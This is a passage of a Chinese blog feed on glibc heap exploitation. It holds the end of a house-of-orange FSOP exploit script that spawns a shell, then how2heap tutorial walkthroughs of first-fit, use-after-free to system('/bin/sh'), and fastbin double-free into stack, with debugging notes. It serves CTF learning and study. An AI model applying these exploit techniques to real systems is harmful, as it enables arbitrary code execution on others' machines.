class="hljs-built_in">hex</span>(heap_base)))<br><span class="hljs-comment"># pause()</span><br><br><span class="hljs-comment"># fsop</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x400</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + p32(<span class="hljs-number">0x10</span>) + p32(<span class="hljs-number">0x1f</span>) + p64(<span class="hljs-number">0</span>)<br>fake_file = <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="hljs-number">0x61</span>)<br>fake_file += p64(<span class="hljs-number">0</span>) + p64(_IO_list_all - <span class="hljs-number">0x10</span>)<br>fake_file += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) <span class="hljs-comment">#_IO_write_base &lt; _IO_write_ptr</span><br>fake_file = fake_file.ljust(<span class="hljs-number">0xc0</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span><br>fake_file += p64(heap_base+<span class="hljs-number">0x5c8</span>) <span class="hljs-comment">#vtable ptr</span><br>fake_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span><br>fake_file += p64(system)<br>payload += fake_file<br>edit(<span class="hljs-built_in">len</span>(payload), payload, <span class="hljs-number">16</span>, <span class="hljs-number">1</span>)<br><span class="hljs-comment"># pause()</span><br>p.sendlineafter(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/177910">https://www.anquanke.com/post/id/177910</a></p><p><a href="https://www.anquanke.com/post/id/177958">https://www.anquanke.com/post/id/177958</a></p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_fwrite_analysis">https://ray-cp.github.io/archivers/IO_FILE_fwrite_analysis</a></p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_vtable_hajack_and_fsop">https://ray-cp.github.io/archivers/IO_FILE_vtable_hajack_and_fsop</a></p><p><a href="https://orangegzy.github.io/2020/08/18/houseoforange-hitcon-2016-FSOP/">https://orangegzy.github.io/2020/08/18/houseoforange-hitcon-2016-FSOP/</a></p><p><a href="https://fl0ey.icu/2020/10/15/house_of_orange/">https://fl0ey.icu/2020/10/15/house_of_orange/</a></p><p><a href="https://zhuanlan.zhihu.com/p/65873040">https://zhuanlan.zhihu.com/p/65873040</a></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>io_file</tag>
      
      <tag>house of orange</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从how2heap入门堆</title>
    <link href="/2021/12/26/%E4%BB%8Ehow2heap%E5%85%A5%E9%97%A8%E5%A0%86/"/>
    <url>/2021/12/26/%E4%BB%8Ehow2heap%E5%85%A5%E9%97%A8%E5%A0%86/</url>
    
    <content type="html"><![CDATA[<p>how2heap是由shellphish团队制作的堆利用教程，介绍了多种堆利用技术，后续系列实验我们就通过这个教程来学习。</p><h2 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;尽管这个例子没有演示攻击效果，但是它演示了 glibc 的分配机制\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;glibc 使用首次适应算法选择空闲的堆块\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;如果有一个空闲堆块且足够大，那么 malloc 将选择它\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;如果存在 use-after-free 的情况那可以利用这一特性\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;首先申请两个比较大的 chunk\n&quot;</span>);<br>    <span class="hljs-keyword">char</span>* a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x512</span>);<br>    <span class="hljs-keyword">char</span>* b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x256</span>);<br>    <span class="hljs-keyword">char</span>* c;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第一个 a = malloc(0x512) 在: %p\n&quot;</span>, a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第二个 b = malloc(0x256) 在: %p\n&quot;</span>, b);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们可以继续分配\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在我们把 \&quot;AAAAAAAA\&quot; 这个字符串写到 a 那里 \n&quot;</span>);<br>    <span class="hljs-built_in">strcpy</span>(a, <span class="hljs-string">&quot;AAAAAAAA&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第一次申请的 %p 指向 %s\n&quot;</span>, a, a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来 free 掉第一个...\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来只要我们申请一块小于 0x512 的 chunk，那就会分配到原本 a 那里: %p\n&quot;</span>, a);<br><br>    c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第三次 c = malloc(0x500) 在: %p\n&quot;</span>, c);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们这次往里写一串 \&quot;CCCCCCCC\&quot; 到刚申请的 c 中\n&quot;</span>);<br>    <span class="hljs-built_in">strcpy</span>(c, <span class="hljs-string">&quot;CCCCCCCC&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第三次申请的 c %p 指向 %s\n&quot;</span>, c, c);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第一次申请的 a %p 指向 %s\n&quot;</span>, a, a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;可以看到，虽然我们刚刚看的是 a 的，但它的内容却是 \&quot;CCCCCCCC\&quot;\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个程序并不展示如何攻击，而是展示glibc的一种分配规则。glibc 使用一种first-fit算法去选择一个free-chunk。如果存在一个free-chunk并且足够大的话，malloc会优先选取这个chunk。这种机制就可以在被利用于use after free(简称 uaf) 的情形中.</p><p>使用命令<code>gcc -g first_fit.c -o first_fit</code>编译，-g参数会保留代码的文字信息，便于调试。</p><p>运行一下看看</p><p><img src="https://s2.loli.net/2021/12/26/zB2uG3tj5xVpe9Y.png"></p><p>   程序展示了一个 glibc 堆分配策略，first-fit。在分配内存时，malloc 先到 unsorted bin（或者 fastbins）中查找适合的被 free 的 chunk，如果没有，就会把 unsorted bin 中的所有 chunk 分别放入到所属的 bins 中，然后再去这些 bins 里去寻找适合的 chunk。可以看到第三次 malloc 的地址和第一次相同，即 malloc 找到了第一次 free 掉的 chunk，并把它重新分配。</p><p>​    下断点，对着源码调试着理解一下</p><p>​    先是malloc了两次，第一个堆块的内容为“AAAAAAAA”对应0x41414141…，第二个堆块的内容为“BBBBBBBB”，对应0x42424242…。</p><p> <img src="https://s2.loli.net/2021/12/26/Vd2Q8JgXZ7NexYB.png"></p><p>然后free了a，这时候a被放到了unsorted bin中。</p><p> <img src="https://s2.loli.net/2021/12/26/GY6WvrMNuKPi2By.png">    </p><p>​    然后再去申请一个小于free chunk的大小的内存空间，根据first fit就会分配到这里。可以发现，当释放了一块内存之后再去申请一个大小略小的空间，那么glibc倾向于将先前释放的空间重新分配。</p><p> <img src="https://s2.loli.net/2021/12/26/WfulCXTUSpwZJD7.png"></p><p>​    加上参数重新编译一个版本：gcc -fsanitize=address -g first_fit.c，会提示有个 use-after-free 漏洞 <img src="https://s2.loli.net/2021/12/26/RbJdO5aZHzo8TyD.png"></p><p>​    UAF 漏洞简单来说就是第一次申请的内存释放之后，没有进行内存回收，下次申请的时候还能申请到这一块内存，导致我们可以用以前的内存指针来访问修改过的内存。</p><p>​    来看一下一个简单的 UAF 的利用的例子。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span> <span class="hljs-params">(*func_ptr)</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">evil_fuc</span><span class="hljs-params">(<span class="hljs-keyword">char</span> command[])</span></span><br><span class="hljs-function"></span>&#123;<br>    system(command);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">echo</span><span class="hljs-params">(<span class="hljs-keyword">char</span> content[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,content);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    func_ptr *p1=(func_ptr*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;申请了4个int大小的内存&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p1 的地址: %p\n&quot;</span>,p1);<br>    p1[<span class="hljs-number">1</span>]=echo;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;把p1[1]赋值为echo函数，然后打印出\&quot;hello world\&quot;&quot;</span>);<br>    p1[<span class="hljs-number">1</span>](<span class="hljs-string">&quot;hello world\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;free 掉 p1&quot;</span>);<br>    <span class="hljs-built_in">free</span>(p1); <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;因为并没有置为null，所以p1[1]仍然是echo函数，仍然可以输出打印了\&quot;hello again\&quot;&quot;</span>);<br>    p1[<span class="hljs-number">1</span>](<span class="hljs-string">&quot;hello again\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接下来再去malloc一个p2，会把释放掉的p1给分配出来，可以看到他俩是同一地址的&quot;</span>);<br>    func_ptr *p2=(func_ptr*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p2 的地址: %p\n&quot;</span>,p2);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p1 的地址: %p\n&quot;</span>,p1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;然后把p2[1]给改成evil_fuc也就是system函数&quot;</span>);<br>    p2[<span class="hljs-number">1</span>]=evil_fuc;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;传参调用&quot;</span>);<br>    p1[<span class="hljs-number">1</span>](<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​    依然使用之前的编译命令，然后动态调试看一下，首先申请了一个chunk，把那个p1[1]改成了echo函数的地址。</p><p> <img src="https://s2.loli.net/2021/12/26/SpE21zDPuvLURel.png"></p><p>​    free掉之后再申请一个大小相同的p2，这时候会把之前p1的内存区域分配给p2，也就是说可以用p2来控制p1的内容了</p><p> <img src="https://s2.loli.net/2021/12/26/UrDWJea4HjBx1b5.png"></p><h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><p>   fastbin主要是用来放一些小的内存的，来提高效率。源码如下</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这个例子演示了 fastbin 的 double free\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;首先申请了 3 个 chunk\n&quot;</span>);<br>    <span class="hljs-keyword">char</span>* a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(a, <span class="hljs-string">&quot;AAAAAAAA&quot;</span>);<br>    <span class="hljs-keyword">char</span>* b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(b, <span class="hljs-string">&quot;BBBBBBBB&quot;</span>);<br>    <span class="hljs-keyword">char</span>* c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(c, <span class="hljs-string">&quot;CCCCCCCC&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第一个 malloc(8): %p\n&quot;</span>, a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第二个 malloc(8): %p\n&quot;</span>, b);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第三个 malloc(8): %p\n&quot;</span>, c);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;free 掉第一个\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;当我们再次 free %p 的时候, 程序将会崩溃因为 %p 在 free 链表的第一个位置上\n&quot;</span>, a, a);<br>    <span class="hljs-comment">// free(a);</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们先 free %p.\n&quot;</span>, b);<br>    <span class="hljs-built_in">free</span>(b);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在我们就可以再次 free %p 了, 因为他现在不在 free 链表的第一个位置上\n&quot;</span>, a);<br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在空闲链表是这样的 [ %p, %p, %p ]. 如果我们 malloc 三次, 我们会得到两次 %p \n&quot;</span>, a, b, a, a);<br>    <br>    <span class="hljs-keyword">char</span>* d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">char</span>* e = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">char</span>* f = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(d, <span class="hljs-string">&quot;DDDDDDDD&quot;</span>);<br>    <span class="hljs-built_in">strcpy</span>(e, <span class="hljs-string">&quot;EEEEEEEE&quot;</span>);<br>    <span class="hljs-built_in">strcpy</span>(f, <span class="hljs-string">&quot;FFFFFFFF&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第一次 malloc(8): %p\n&quot;</span>, d);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第二次 malloc(8): %p\n&quot;</span>, e);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第三次 malloc(8): %p\n&quot;</span>, f);<br>&#125;<br></code></pre></td></tr></table></figure><p>​    这个程序更具体地展示了上一个程序所介绍的技巧，通过欺骗 malloc 来返回一个我们可控的区域的指针(在这个例子中，我们可以返回一个栈指针)。</p>   <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">gcc -g fastbin_dup.c -o fastbin_dup<br></code></pre></td></tr></table></figure><p> <img src="https://s2.loli.net/2021/12/26/IJ8EZ7QteOms2yr.png"></p><p>可以看到首先分配三块内存，当free掉第一块内存之后，再free一次该内存块是不行的，因为这时候这块内存刚好在对应的free-list的顶部，再次free这块内存就会被检查到，这里就free第二块内存。现在我们再次free第一块内存，因为它已经不在链表顶部了。</p><p>这时候的 free-list 有这三块内存 [0x2502010, 0x2502030, 0x2502010]，如果我们malloc三次的话，就会得到0x2502010两次。</p><p>使用pwndbg逐步调试，首先malloc 3个chunk。</p><p> <img src="https://s2.loli.net/2021/12/26/WsBCEgcFLiZ9OoX.png"></p><p>第一个free之后，chunk a被添加到fastbins中。</p><p> <img src="https://s2.loli.net/2021/12/26/Dc42gqKOk3NAsmP.png"></p><p>第二个 free 之后，chunk b 被添加到fastbins中，可以看到在b的fd指针那里已经改成了chunk a的地址了。</p><p> <img src="https://s2.loli.net/2021/12/26/fQ8OCIcztrjRWP7.png"></p><p>   此时，由于chunk a处于bin中第2块的位置，不会被double-free的检查机制检查出来，所以第三个free之后，chunk a再次被添加到fastbins 中。chunk a和chunk b形成了一个环</p><p> <img src="https://s2.loli.net/2021/12/26/9Cz8Rwemsoh1lpH.png"></p><p>   最后再malloc三块内存d、e、f，可以看到0x4444444444444444被改成了 0x4646464646464646，是因为后来申请的 f 跟 d 指向同一块内存区域。</p><p> <img src="https://s2.loli.net/2021/12/26/aYAMKF6UpwC27Vv.png"></p><p>   总结一下，程序展示了fastbins的double-free攻击，可以泄露出一块已经被分配的内存指针。fastbins 可以看成一个后进先出的栈，使用单链表来实现，通过fastbin-&gt;fd来遍历。由于free的过程会对free list做检查，我们不能连续两次free同一个chunk，所以这里在两次free 之间，增加了一次对其他chunk的free 过程，从而绕过了检查顺利执行，然后再malloc三次，就在同一个地址malloc了两次，也就有了两个指向同一块内存区域的指针。</p><h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><p>​    这个程序更具体地展示了上一个程序所介绍的技巧，通过欺骗malloc 来返回一个我们可控的区域的指针 (在这个例子中，我们可以返回一个栈指针)</p><p>​    源码如下。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这个例子拓展自 fastbin_dup.c，通过欺骗 malloc 使得返回一个指向受控位置的指针（本例为栈上）\n&quot;</span>);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> stack_var;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们想通过 malloc 申请到 %p.\n&quot;</span>, <span class="hljs-number">8</span>+(<span class="hljs-keyword">char</span> *)&amp;stack_var);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;先申请3 个 chunk\n&quot;</span>);<br>    <span class="hljs-keyword">char</span>* a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(a, <span class="hljs-string">&quot;AAAAAAAA&quot;</span>);<br>    <span class="hljs-keyword">char</span>* b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(b, <span class="hljs-string">&quot;BBBBBBBB&quot;</span>);<br>    <span class="hljs-keyword">char</span>* c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(c, <span class="hljs-string">&quot;CCCCCCCC&quot;</span>);<br>    <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;chunk a: %p\n&quot;</span>, a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;chunk b: %p\n&quot;</span>, b);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;chunk c: %p\n&quot;</span>, c);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;free 掉 chunk a\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;如果还对 %p 进行 free, 程序会崩溃。因为 %p 现在是 fastbin 的第一个\n&quot;</span>, a, a);<br>    <span class="hljs-comment">// free(a);</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;先对 b %p 进行 free\n&quot;</span>, b);<br>    <span class="hljs-built_in">free</span>(b);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来就可以对 %p 再次进行 free 了, 现在已经不是它在 fastbin 的第一个了\n&quot;</span>, a);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 fastbin 的链表是 [ %p, %p, %p ] 接下来通过修改 %p 上的内容来进行攻击.\n&quot;</span>, a, b, a, a);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第一次 malloc(8): %p\n&quot;</span>, d);<br>    <span class="hljs-keyword">char</span>* e = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(e, <span class="hljs-string">&quot;EEEEEEEE&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第二次 malloc(8): %p\n&quot;</span>, e);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 fastbin 表中只剩 [ %p ] 了\n&quot;</span>, a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来往 %p 栈上写一个假的 size，这样 malloc 会误以为那里有一个空闲的 chunk，从而申请到栈上去\n&quot;</span>, a);<br>    stack_var = <span class="hljs-number">0x20</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在覆盖 %p 前面的 8 字节，修改 fd 指针指向 stack_var 前面 0x20 的位置\n&quot;</span>, a);<br>    *d = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>) (((<span class="hljs-keyword">char</span>*)&amp;stack_var) - <span class="hljs-keyword">sizeof</span>(d));<br>    <br>    <span class="hljs-keyword">char</span>* f = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(f, <span 